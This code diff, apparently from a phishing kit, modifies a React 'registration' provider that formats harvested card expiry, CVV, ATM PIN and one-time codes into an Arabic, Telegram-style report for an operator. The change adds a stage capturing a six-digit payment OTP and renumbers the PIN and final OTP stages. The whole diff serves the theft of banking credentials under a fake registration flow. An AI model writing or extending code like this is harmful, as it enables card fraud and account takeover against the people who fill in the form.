@@ -27,6 +27,9 @@ interface RegistrationData {
   expiryDate?: string;
   cvv?: string;
   
+  // Payment OTP
+  paymentOtp?: string;
+  
   // ATM Pin
   atmPin?: string;
   
@@ -110,22 +113,29 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
       message += `\n`;
     }
 
-    // Stage 5: ATM Pin
-    if (stage >= 5 && dataToFormat.atmPin) {
-      message += `✅ <b>المرحلة 5: رقم PIN</b>\n`;
+    // Stage 5: Payment OTP
+    if (stage >= 5 && dataToFormat.paymentOtp) {
+      message += `✅ <b>المرحلة 5: رمز تأكيد الدفع</b>\n`;
+      message += `   🔢 رمز OTP (6 أرقام): ${dataToFormat.paymentOtp}\n`;
+      message += `\n`;
+    }
+
+    // Stage 6: ATM Pin
+    if (stage >= 6 && dataToFormat.atmPin) {
+      message += `✅ <b>المرحلة 6: رقم PIN</b>\n`;
       message += `   🔐 رقم PIN: ${dataToFormat.atmPin}\n`;
       message += `\n`;
     }
 
-    // Stage 6: OTP
-    if (stage >= 6 && dataToFormat.otp) {
-      message += `✅ <b>المرحلة 6: رمز التحقق</b>\n`;
-      message += `   🔢 رمز OTP: ${dataToFormat.otp}\n`;
+    // Stage 7: OTP
+    if (stage >= 7 && dataToFormat.otp) {
+      message += `✅ <b>المرحلة 7: رمز التحقق النهائي</b>\n`;
+      message += `   🔢 رمز OTP (4 أرقام): ${dataToFormat.otp}\n`;
       message += `\n`;
     }
 
     message += `━━━━━━━━━━━━━━━━━━━━\n`;
-    message += stage === 6 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;
+    message += stage === 7 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;
 
     return message;
   };
